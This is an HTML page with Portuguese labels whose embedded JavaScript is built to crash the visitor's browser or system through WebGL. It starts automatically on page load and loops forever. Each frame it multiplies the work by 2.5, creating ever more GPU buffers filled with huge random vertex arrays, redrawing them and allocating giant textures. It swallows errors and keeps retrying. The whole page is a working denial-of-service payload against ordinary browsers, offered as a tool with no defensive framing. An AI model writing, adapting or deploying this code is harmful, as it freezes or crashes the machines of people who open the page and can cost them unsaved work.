<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <title>WebGL Crash Instantâneo</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: #000;
            color: #ff0000;
            font-family: 'Courier New', monospace;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            overflow: hidden;
        }
        
        .warning {
            text-align: center;
            padding: 20px;
            animation: glitch 0.5s infinite;
        }
        
        @keyframes glitch {
            0% { transform: translate(0); }
            20% { transform: translate(-2px, 2px); }
            40% { transform: translate(-2px, -2px); }
            60% { transform: translate(2px, 2px); }
            80% { transform: translate(2px, -2px); }
            100% { transform: translate(0); }
        }
        
        .status {
            font-size: 24px;
            margin: 20px;
            text-align: center;
        }
        
        .counter {
            font-size: 18px;
            margin: 10px;
        }
        
        canvas {
            border: 1px solid #ff0000;
            margin: 10px;
        }
        
        .flashing {
            animation: flash 0.3s infinite alternate;
        }
        
        @keyframes flash {
            from { opacity: 1; }
            to { opacity: 0.3; }
        }
    </style>
</head>
<body>
    <div class="warning">
        <h1>⚠️ SISTEMA SENDO TRAVADO ⚠️</h1>
        <p>CRASH WEBGL INSTANTÂNEO INICIADO</p>
    </div>
    
    <div class="status" id="status">INICIANDO CRASH INSTANTÂNEO...</div>
    <div class="counter">Buffers: <span id="bufferCount">0</span></div>
    <canvas id="gl-canvas" width="800" height="600"></canvas>

    <script>
        // Inicializa WebGL
        const canvas = document.getElementById('gl-canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        
        if (!gl) {
            document.getElementById('status').textContent = 'WebGL não suportado';
            throw new Error('WebGL não suportado');
        }

        // Shaders simples
        const vertexShaderSource = `
            attribute vec2 a_position;
            void main() {
                gl_Position = vec4(a_position, 0.0, 1.0);
                gl_PointSize = 2.0;
            }
        `;
        
        const fragmentShaderSource = `
            precision highp float;
            void main() {
                gl_FragColor = vec4(1.0, 0.0, 0.0, 1.0);
            }
        `;

        // Compila shaders rapidamente
        function createShader(gl, type, source) {
            const shader = gl.createShader(type);
            gl.shaderSource(shader, source);
            gl.compileShader(shader);
            return shader;
        }

        // Cria programa WebGL
        const vertexShader = createShader(gl, gl.VERTEX_SHADER, vertexShaderSource);
        const fragmentShader = createShader(gl, gl.FRAGMENT_SHADER, fragmentShaderSource);
        const program = gl.createProgram();
        gl.attachShader(program, vertexShader);
        gl.attachShader(program, fragmentShader);
        gl.linkProgram(program);
        gl.useProgram(program);

        // Estado do crash
        let bufferCount = 0;
        const buffers = [];
        let crashMultiplier = 1;
        let frameCount = 0;
        
        // Elementos da UI
        const statusElement = document.getElementById('status');
        const bufferCountElement = document.getElementById('bufferCount');
        
        // Função de crash WebGL infinito e instantâneo
        function instantWebGLCrash() {
            try {
                frameCount++;
                
                // Aumenta agressivamente o multiplicador
                crashMultiplier *= 2.5;
                
                // Cria MUITOS buffers instantaneamente
                const buffersToCreate = Math.floor(50 * crashMultiplier);
                
                for (let i = 0; i < buffersToCreate; i++) {
                    // Cria buffer com número massivo de vértices
                    const vertexCount = Math.floor(500000 * crashMultiplier);
                    const vertices = new Float32Array(vertexCount * 2);
                    
                    // Preenche com dados aleatórios
                    for (let j = 0; j < vertexCount * 2; j++) {
                        vertices[j] = Math.random() * 2 - 1;
                    }
                    
                    // Cria e armazena o buffer
                    const buffer = gl.createBuffer();
                    gl.bindBuffer(gl.ARRAY_BUFFER, buffer);
                    gl.bufferData(gl.ARRAY_BUFFER, vertices, gl.DYNAMIC_DRAW);
                    buffers.push(buffer);
                    bufferCount++;
                    
                    // Atualiza contador
                    bufferCountElement.textContent = bufferCount.toLocaleString();
                    
                    // Desenha para consumir recursos
                    const positionLocation = gl.getAttribLocation(program, 'a_position');
                    gl.enableVertexAttribArray(positionLocation);
                    gl.vertexAttribPointer(positionLocation, 2, gl.FLOAT, false, 0, 0);
                    
                    // Múltiplos desenhos por buffer
                    for (let k = 0; k < 10; k++) {
                        gl.drawArrays(gl.POINTS, 0, vertexCount);
                    }
                }
                
                // Cria texturas enormes também
                if (frameCount % 5 === 0) {
                    const texture = gl.createTexture();
                    gl.bindTexture(gl.TEXTURE_2D, texture);
                    const size = Math.min(16384, 512 * crashMultiplier);
                    const data = new Uint8Array(size * size * 4);
                    gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, size, size, 0, gl.RGBA, gl.UNSIGNED_BYTE, data);
                }
                
                // Atualiza status
                if (frameCount < 10) {
                    statusElement.textContent = `CRASH INICIADO - Frame ${frameCount}`;
                } else if (frameCount < 20) {
                    statusElement.textContent = `ACELERANDO - ${bufferCount.toLocaleString()} buffers`;
                    statusElement.classList.add('flashing');
                } else {
                    statusElement.textContent = `TRAVANDO SISTEMA - ${bufferCount.toLocaleString()} buffers`;
                }
                
                // Continua o loop infinito
                requestAnimationFrame(instantWebGLCrash);
                
            } catch (e) {
                // Ignora erros e continua tentando
                statusElement.textContent = `CRASH COMPLETO - ${bufferCount.toLocaleString()} buffers criados`;
                setTimeout(instantWebGLCrash, 10);
            }
        }
        
        // Inicia o crash instantaneamente quando a página carrega
        window.addEventListener('load', function() {
            statusElement.textContent = 'INICIANDO CRASH INSTANTÂNEO...';
            
            // Pequeno delay para garantir que tudo carregou
            setTimeout(() => {
                instantWebGLCrash();
            }, 100);
        });
        
        // Também inicia se a página já estiver carregada
        if (document.readyState === 'complete') {
            setTimeout(() => {
                instantWebGLCrash();
            }, 100);
        }
        
        // Desenho inicial rápido
        gl.clearColor(0.0, 0.0, 0.0, 1.0);
        gl.clear(gl.COLOR_BUFFER_BIT);
        
    </script>
</body>
</html>
